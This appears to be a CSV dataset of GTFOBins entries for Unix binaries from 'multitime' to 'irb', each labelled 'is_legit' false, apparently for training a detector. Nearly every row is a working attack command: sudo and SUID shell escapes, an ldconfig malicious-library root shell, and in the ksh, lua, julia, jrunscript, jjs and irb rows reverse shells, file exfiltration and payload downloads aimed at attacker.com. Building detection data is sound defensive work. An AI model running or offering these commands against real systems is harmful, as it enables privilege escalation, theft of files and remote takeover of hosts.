"Name","functions","functions_shell","functions_shell_description","functions_shell_code","functions_sudo","functions_sudo_description","functions_sudo_code","description","functions_file-read","functions_file-read_code","functions_suid","functions_suid_code","functions_file-write","functions_file-write_code","functions_limited-suid","functions_limited-suid_code","functions_file-download","functions_file-download_description","functions_file-download_code","functions_file-read_description","functions_suid_description","functions_non-interactive-reverse-shell","functions_non-interactive-reverse-shell_description","functions_non-interactive-reverse-shell_code","functions_command","functions_command_description","functions_command_code","functions_file-upload","functions_file-upload_description","functions_file-upload_code","functions_file-write_description","functions_reverse-shell","functions_reverse-shell_description","functions_reverse-shell_code","functions_non-interactive-bind-shell","functions_non-interactive-bind-shell_description","functions_non-interactive-bind-shell_code","functions_library-load","functions_library-load_description","functions_library-load_code","functions_capabilities","functions_capabilities_description","functions_capabilities_code","functions_limited-suid_description","functions_bind-shell","functions_bind-shell_description","functions_bind-shell_code","is_legit"
"multitime","","","multitime /bin/sh","","","sudo multitime /bin/sh","","","","","./multitime /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"mtr","","","","","","LFILE=file_to_read sudo mtr --raw -F ""$LFILE""","The read file content is corrupted by error prints.","","LFILE=file_to_read mtr --raw -F ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"msguniq","","","","","","LFILE=file_to_read sudo msguniq -P $LFILE","The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.","","LFILE=file_to_read msguniq -P $LFILE","","LFILE=file_to_read ./msguniq -P $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"msgmerge","","","","","","LFILE=file_to_read sudo msgmerge -P $LFILE /dev/null","The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.","","LFILE=file_to_read msgmerge -P $LFILE /dev/null","","LFILE=file_to_read ./msgmerge -P $LFILE /dev/null","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"msgfilter","","Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.","echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'","","Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.","echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'","","","LFILE=file_to_read msgfilter -P -i ""LFILE"" /bin/cat","","echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'","","","","","","","","The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data. `/bin/cat` can be replaced with any other *filter* program.","Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"msgconv","","","","","","LFILE=file_to_read sudo msgconv -P $LFILE","The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.","","LFILE=file_to_read msgconv -P $LFILE","","LFILE=file_to_read ./msgconv -P $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"msgcat","","","","","","LFILE=file_to_read sudo msgcat -P $LFILE","The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.","","LFILE=file_to_read msgcat -P $LFILE","","LFILE=file_to_read ./msgcat -P $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"msgattrib","","","","","","LFILE=file_to_read sudo msgattrib -P $LFILE","The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.","","LFILE=file_to_read msgattrib -P $LFILE","","LFILE=file_to_read ./msgattrib -P $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"msfconsole","","","sudo msfconsole msf6 > irb >> system(""/bin/sh"")","","","sudo msfconsole msf6 > irb >> system(""/bin/sh"")","This allows to spawn a [`ruby`](/gtfobins/ruby/) interpreter.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"mount","","","","","Exploit the fact that `mount` can be executed via `sudo` to *replace* the `mount` binary with a shell.","sudo mount -o bind /bin/sh /bin/mount sudo mount","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"mosquitto","","","","","","LFILE=file_to_read sudo mosquitto -c ""$LFILE""","The file is actually parsed and the first wrong line (ending with a newline or a null character) is returned in an error message, thus it may not be suitable for reading arbitrary files","","LFILE=file_to_read mosquitto -c ""$LFILE""","","LFILE=file_to_read ./mosquitto -c ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"more","","","TERM= more /etc/profile !/bin/sh","","","TERM= sudo more /etc/profile !/bin/sh","","","more file_to_read","","./more file_to_read","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"minicom","","[''Start the following command to open the TUI interface, then: 1. press `Ctrl-A o` and select `Filenames and paths`; 2. press `e`, type `/bin/sh`, then `Enter`; 3. Press `Esc` twice; 4. Press `Ctrl-A k` to drop the shell. After the shell, exit with `Ctrl-A x`. ''-|-''After the shell, exit with `Ctrl-A x`. '']","[''minicom -D /dev/null ''-|-''TF=$(mktemp) echo ""! exec /bin/sh <$(tty) 1>$(tty) 2>$(tty)"" >$TF minicom -D /dev/null -S $TF reset^J '']","","Start the following command to open the TUI interface, then: 1. press `Ctrl-A o` and select `Filenames and paths`; 2. press `e`, type `/bin/sh`, then `Enter`; 3. Press `Esc` twice; 4. Press `Ctrl-A k` to drop the shell. After the shell, exit with `Ctrl-A x`.","sudo minicom -D /dev/null","Note that in some versions, `Meta-Z` is used in place of `Ctrl-A`.","","","","./minicom -D /dev/null","","","","","","","","","Start the following command to open the TUI interface, then: 1. press `Ctrl-A o` and select `Filenames and paths`; 2. press `e`, type `/bin/sh -p`, then `Enter`; 3. Press `Esc` twice; 4. Press `Ctrl-A k` to drop the shell. After the shell, exit with `Ctrl-A x`.","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"mawk","","","mawk 'BEGIN {system(""/bin/sh"")}'","","","sudo mawk 'BEGIN {system(""/bin/sh"")}'","","","LFILE=file_to_read mawk '//' ""$LFILE""","","LFILE=file_to_read ./mawk '//' ""$LFILE""","","LFILE=file_to_write mawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'","","./mawk 'BEGIN {system(""/bin/sh"")}'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"man","","This only works for GNU `man` and requires GNU `troff` (`groff` to be installed).","[''man man !/bin/sh ''-|-''man '-H/bin/sh #' man '']","","","sudo man man !/bin/sh","This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply.","","man file_to_read","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"make","","","COMMAND='/bin/sh' make -s --eval=$'x:\n\t-'""$COMMAND""","","","COMMAND='/bin/sh' sudo make -s --eval=$'x:\n\t-'""$COMMAND""","All these examples only work with GNU `make` due to the lack of support of the `--eval` flag. The same can be achieved by using a proper `Makefile` or by passing the content via stdin using `-f -`.","","","","COMMAND='/bin/sh -p' ./make -s --eval=$'x:\n\t-'""$COMMAND""","","LFILE=file_to_write make -s --eval=""\$(file >$LFILE,DATA)"" .","","","","","","","","","","","","","","","","","Requires a newer GNU `make` version.","","","","","","","","","","","","","","","","","false"
"mail","","[''GNU version only.''-|-''This creates a valid Mbox file which may be required by the binary.'']","[''mail --exec='!/bin/sh'''-|-''TF=$(mktemp) echo ""From nobody@localhost $(date)"" > $TF mail -f $TF !/bin/sh '']","","GNU version only.","sudo mail --exec='!/bin/sh'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"lwp-request","","","","","","LFILE=file_to_read sudo lwp-request ""file://$LFILE""","","","LFILE=file_to_read lwp-request ""file://$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"lwp-download","","","","","","URL=http://attacker.com/file_to_get LFILE=file_to_save sudo lwp-download $URL $LFILE","Fetch a remote file via HTTP GET request.","","LFILE=file_to_read TF=$(mktemp) lwp-download ""file://$LFILE"" $TF cat $TF","","","","LFILE=file_to_write TF=$(mktemp) echo DATA >$TF lwp-download file://$TF $LFILE","","","","","URL=http://attacker.com/file_to_get LFILE=file_to_save lwp-download $URL $LFILE","The file path must be absolute.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"luatex","","","luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'","","","sudo luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'","This allows to execute [`lua`](/gtfobins/lua/) code.","","","","","","","","./luatex -shell-escape '\directlua{os.execute(""/bin/sh"")}\end'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"lualatex","","","lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute(""/bin/sh"")}\end{document}'","","","sudo lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute(""/bin/sh"")}\end{document}'","This allows to execute [`lua`](/gtfobins/lua/) code.","","","","","","","","./lualatex -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute(""/bin/sh"")}\end{document}'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"lua","","","lua -e 'os.execute(""/bin/sh"")'","","","sudo lua -e 'os.execute(""/bin/sh"")'","","","lua -e 'local f=io.open(""file_to_read"", ""rb""); print(f:read(""*a"")); io.close(f);'","","lua -e 'local f=io.open(""file_to_read"", ""rb""); print(f:read(""*a"")); io.close(f);'","","lua -e 'local f=io.open(""file_to_write"", ""wb""); f:write(""DATA""); io.close(f);'","","./lua -e 'os.execute(""/bin/sh"")'","","Fetch a remote file via TCP. Run `nc target.com 12345 < ""file_to_send""` on the attacker box to send the file. This requires `lua-socket` installed.","export LPORT=12345 export LFILE=file_to_save lua -e 'local k=require(""socket"");   local s=assert(k.bind(""*"",os.getenv(""LPORT"")));   local c=s:accept();   local d,x=c:receive(""*a"");   c:close();   local f=io.open(os.getenv(""LFILE""), ""wb"");   f:write(d);   io.close(f);'","","","","Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires `lua-socket` installed.","export RHOST=attacker.com export RPORT=12345 lua -e 'local s=require(""socket"");   local t=assert(s.tcp());   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));   while true do     local r,x=t:receive();local f=assert(io.popen(r,""r""));     local b=assert(f:read(""*a""));t:send(b);   end;   f:close();t:close();'","","","","","Send a local file via TCP. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file. This requires `lua-socket` installed.","RHOST=attacker.com RPORT=12345 LFILE=file_to_send lua -e '   local f=io.open(os.getenv(""LFILE""), 'rb')   local d=f:read(""*a"")   io.close(f);   local s=require(""socket"");   local t=assert(s.tcp());   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));   t:send(d);   t:close();'","","","","","","Run `nc target.com 12345` on the attacker box to connect to the shell. This requires `lua-socket` installed.","export LPORT=12345 lua -e 'local k=require(""socket"");   local s=assert(k.bind(""*"",os.getenv(""LPORT"")));   local c=s:accept();   while true do     local r,x=c:receive();local f=assert(io.popen(r,""r""));     local b=assert(f:read(""*a""));c:send(b);   end;c:close();f:close();'","","","","","","","","","","","false"
"ltrace","","","ltrace -b -L /bin/sh","","","sudo ltrace -b -L /bin/sh","","","LFILE=file_to_read ltrace -F $LFILE /dev/null","","","","LFILE=file_to_write ltrace -s 999 -o $LFILE ltrace -F DATA","","","","","","The file is parsed as a configuration file and its content is shown as error messages, thus this is not suitable to exfiltrate binary files.","","","","","","","","","","","The data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of `ltrace -F DATA`.","","","","","","","","","","","","","","","","","false"
"lp","","","","","","","","","","","","","","","","","","","","","","","","","","","","To collect the file run the following on the attacker box (this requires `cups` to be installed):  1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer; 2. `lpadmin -d printer` to set the new printer as default; 3. `cupsctl --remote-any` to enable printing from the Internet; 4. `nc -lkp 9100` to receive the file.  Send a local file to a CUPS server.","LFILE=file_to_send RHOST=attacker.com lp $LFILE -h $RHOST","","","","","","","","","","","","","","","","","","false"
"look","","","","","","LFILE=file_to_read sudo look '' ""$LFILE""","","","LFILE=file_to_read look '' ""$LFILE""","","LFILE=file_to_read ./look '' ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"logsave","","","logsave /dev/null /bin/sh -i","","","sudo logsave /dev/null /bin/sh -i","","","","","./logsave /dev/null /bin/sh -i -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"loginctl","","","loginctl user-status !/bin/sh","","","sudo loginctl user-status !/bin/sh","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.  This might not work if run by unprivileged users depending on the system configuration.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ln","","","","","","sudo ln -fs /bin/sh /bin/ln sudo ln","This overrides `ln` itself with a symlink to a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `ln` by path. Warning, this is a destructive action.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"links","","","","","","LFILE=file_to_read sudo links ""$LFILE""","The result is displayed in a TUI interface.","","LFILE=file_to_read links ""$LFILE""","","LFILE=file_to_read ./links ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"lftp","","","lftp -c '!/bin/sh'","","","sudo lftp -c '!/bin/sh'","","","","","","","","","./lftp -c '!/bin/sh'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"less","","","[''less /etc/profile !/bin/sh ''-|-''VISUAL=""/bin/sh -c '/bin/sh'"" less /etc/profile v ''-|-''less /etc/profile v:shell '']","","","sudo less /etc/profile !/bin/sh","","","[''less file_to_read''-|-''less /etc/profile :e file_to_read '']","","./less file_to_read","","[''echo DATA | less sfile_to_write q ''-|-''less file_to_write v '']","","","","","","This is useful when `less` is used as a pager by another binary to read a different file.","","","","","","","","","","","This invokes the default editor to edit the file. The file must exist.","","","","","","","","","","","","","","","","","false"
"ldconfig","","","","","This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries.","TF=$(mktemp -d) echo ""$TF"" > ""$TF/conf"" # move malicious libraries in $TF sudo ldconfig -f ""$TF/conf""","Follows a minimal example of how to use the described technique (details may change across different distributions).  Run the code associated with the technique.  Identify a target SUID executable, for example the `libcap` library of `ping`:  ``` $ ldd /bin/ping | grep libcap       libcap.so.2 => /tmp/tmp.9qfoUyKaGu/libcap.so.2 (0x00007fc7e9797000) ```  Create a fake library that spawns a shell at bootstrap:  ``` echo '#include <unistd.h>  __attribute__((constructor)) static void init() {     execl(""/bin/sh"", ""/bin/sh"", ""-p"", NULL); } ' >""$TF/lib.c"" ```  Compile it with:  ``` gcc -fPIC -shared ""$TF/lib.c"" -o ""$TF/libcap.so.2"" ```  Run `ldconfig` again as described below then just run `ping` to obtain a root shell:  ``` $ ping # id uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user) ```","","","","","","","","TF=$(mktemp -d) echo ""$TF"" > ""$TF/conf"" # move malicious libraries in $TF ./ldconfig -f ""$TF/conf""","","","","","","","","","","","","","","","","","","","","","","","","","","","","This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries.","","","","false"
"ld.so","","","/lib/ld.so /bin/sh","","","sudo /lib/ld.so /bin/sh","`ld.so` is the Linux dynamic linker/loader, its filename and location might change across distributions. The proper path is can be obtained with:  ``` $ strings /proc/self/exe | head -1 /lib64/ld-linux-x86-64.so.2 ```  It's worth noting that the spawned process will be the loader, not the target executable, this might aid evasion. See https://shyft.us/posts/20230526_linux_command_proxy.html for more information.","","","","./ld.so /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"latexmk","","","[''latexmk -e 'exec ""/bin/sh"";' ''-|-''latexmk -latex='/bin/sh #' /dev/null '']","","","sudo latexmk -e 'exec ""/bin/sh"";'","This allows to execute [`perl`](/gtfobins/perl/) code.","","[''latexmk -e 'open(X,""/etc/passwd"");while(<X>){print $_;}exit' ''-|-''TF=$(mktemp) echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' >$TF strings tmp.dvi '']","","","","","","","","","","The read file will be part of the output.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"latex","","","latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'","","The read file will be part of the output.","[''sudo latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' strings article.dvi ''-|-''sudo latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}' '']","","","latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' strings article.dvi","","","","","","./latex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'","","","","The read file will be part of the output.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"kubectl","","","","","","LFILE=dir_to_serve sudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/","It serves files from a specified directory via HTTP, i.e., `http://<IP>:4444/x/<file>`.","","","","LFILE=dir_to_serve ./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/","","","","","","","","","","","","","","","","","","LFILE=dir_to_serve kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/","","","","","","","","","","","","","","","","","","false"
"ksu","","","","","","sudo ksu -q -e /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ksshell","","","","","","LFILE=file_to_read sudo ksshell -i $LFILE","Each line is corrupted by a prefix string. Also consider that lines are actually parsed as `kickstart` scripts thus some file contents may lead to unexpected results.","","LFILE=file_to_read ksshell -i $LFILE","","LFILE=file_to_read ./ksshell -i $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ksh","","","ksh","","","sudo ksh","","","[''export LFILE=file_to_read ksh -c 'echo ""$(<$LFILE)""' ''-|-''export LFILE=file_to_read ksh -c $'read -r -d \x04 < ""$LFILE""; echo ""$REPLY""' '']","","./ksh -p","","export LFILE=file_to_write ksh -c 'echo DATA > $LFILE'","","","","[''Fetch a remote file via HTTP GET request.''-|-''Fetch remote file using a TCP connection. Run `nc -l -p 12345 < ""file_to_send""` on the attacker box to send the file.'']","[''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_get ksh -c '{ echo -ne ""GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n"" 1>&3; cat 0<&3; } \     3<>/dev/tcp/$RHOST/$RPORT \     | { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""\r"")"" ] && break; done; cat; } > $LFILE' ''-|-''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_get ksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE' '']","[''It trims trailing newlines.''-|-''It trims trailing newlines.'']","","","","","","","","","[''Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.''-|-''Send local file using a TCP connection. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file.'']","[''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_send ksh -c 'echo -e ""POST / HTTP/0.9\n\n$(cat $LFILE)"" > /dev/tcp/$RHOST/$RPORT' ''-|-''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_send ksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT' '']","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'","","","","","","","","","","","","","","false"
"knife","","","knife exec -E 'exec ""/bin/sh""'","","","sudo knife exec -E 'exec ""/bin/sh""'","This is capable of running [`ruby`](/gtfobins/ruby/) code.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"julia","","","julia -e 'run(`/bin/sh`)'","","","sudo julia -e 'run(`/bin/sh`)'","","","export LFILE=file_to_read julia -e 'print(open(f->read(f, String), ENV[""LFILE""]))'","","./julia -e 'run(`/bin/sh -p`)'","","export LFILE=file_to_write julia -e 'open(f->write(f, ""DATA""), ENV[""LFILE""], ""w"")'","","","","","export URL=http://attacker.com/file_to_get export LFILE=file_to_save julia -e 'download(ENV[""URL""], ENV[""LFILE""])'","","","","","","","","","","","","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 julia -e 'using Sockets; sock=connect(ENV[""RHOST""], parse(Int64,ENV[""RPORT""])); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'","","","","","","","","","","","","","","false"
"jtag","","","jtag --interactive shell /bin/sh","","","sudo jtag --interactive shell /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"jrunscript","","","jrunscript -e ""exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')""","","","sudo jrunscript -e ""exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')""","This tool is installed starting with Java SE 6.","","jrunscript -e 'br = new BufferedReader(new java.io.FileReader(""file_to_read"")); while ((line = br.readLine()) != null) { print(line); }'","","./jrunscript -e ""exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')""","","jrunscript -e 'var fw=new java.io.FileWriter(""./file_to_write""); fw.write(""DATA""); fw.close();'","","","","Fetch a remote file via HTTP GET request.","URL=http://attacker.com/file_to_get LFILE=file_to_save jrunscript -e ""cp('$URL','$LFILE')""","","This has been found working in macOS but failing on Linux systems.","","","","","","","","","","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 jrunscript -e 'var host='""'""""$RHOST""""'""'; var port='""$RPORT""'; var p=new java.lang.ProcessBuilder(""/bin/bash"", ""-i"").redirectErrorStream(true).start(); var s=new java.net.Socket(host,port); var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); java.lang.Thread.sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'","","","","","","","","","","","","","","false"
"jq","","","","","","LFILE=file_to_read sudo jq -Rr . ""$LFILE""","","","LFILE=file_to_read jq -Rr . ""$LFILE""","","LFILE=file_to_read ./jq -Rr . ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"journalctl","","","journalctl !/bin/sh","","","sudo journalctl !/bin/sh","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.  This might not work if run by unprivileged users depending on the system configuration.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"join","","","","","","LFILE=file_to_read sudo join -a 2 /dev/null $LFILE","","","LFILE=file_to_read join -a 2 /dev/null $LFILE","","LFILE=file_to_read ./join -a 2 /dev/null $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"joe","","","joe ^K!/bin/sh","","","sudo joe ^K!/bin/sh","","","","","","","","","./joe ^K!/bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"jjs","","","echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()"" | jjs","","","echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()"" | sudo jjs","This tool is installed starting with Java SE 8.","","echo 'var BufferedReader = Java.type(""java.io.BufferedReader""); var FileReader = Java.type(""java.io.FileReader""); var br = new BufferedReader(new FileReader(""file_to_read"")); while ((line = br.readLine()) != null) { print(line); }' | jjs","","echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()"" | ./jjs","","echo 'var FileWriter = Java.type(""java.io.FileWriter""); var fw=new FileWriter(""./file_to_write""); fw.write(""DATA""); fw.close();' | jjs","","","","Fetch a remote file via HTTP GET request.","export URL=http://attacker.com/file_to_get export LFILE=file_to_save echo ""var URL = Java.type('java.net.URL'); var ws = new URL('$URL'); var Channels = Java.type('java.nio.channels.Channels'); var rbc = Channels.newChannel(ws.openStream()); var FileOutputStream = Java.type('java.io.FileOutputStream'); var fos = new FileOutputStream('$LFILE'); fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE); fos.close(); rbc.close();"" | jjs","","This has been found working in macOS but failing on Linux systems.","","","","","","","","","","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 echo 'var host=Java.type(""java.lang.System"").getenv(""RHOST""); var port=Java.type(""java.lang.System"").getenv(""RPORT""); var ProcessBuilder = Java.type(""java.lang.ProcessBuilder""); var p=new ProcessBuilder(""/bin/bash"", ""-i"").redirectErrorStream(true).start(); var Socket = Java.type(""java.net.Socket""); var s=new Socket(host,port); var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(""java.lang.Thread"").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs","","","","","","","","","","","","","","false"
"ispell","","","ispell /etc/passwd !/bin/sh","","","sudo ispell /etc/passwd !/bin/sh","","","","","./ispell /etc/passwd !/bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"irb","","","irb exec '/bin/bash'","","","sudo irb exec '/bin/bash'","","","irb puts File.read(""file_to_read"")","","","","irb File.open(""file_to_write"", ""w+"") { |f| f.write(""DATA"") }","","","","Fetch a remote file via HTTP GET request.","export URL=http://attacker.com/file_to_get export LFILE=file_to_save irb require 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])","","","","","","","","","","Serve files in the local folder running an HTTP server on port 8888.","irb require 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","export RHOST='127.0.0.1' export RPORT=9000 irb require 'socket'; exit if fork;c=TCPSocket.new(ENV[""RHOST""],ENV[""RPORT""]);while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read} end","","","","","","irb require ""fiddle""; Fiddle.dlopen(""lib.so"")","","","","","","","","false"
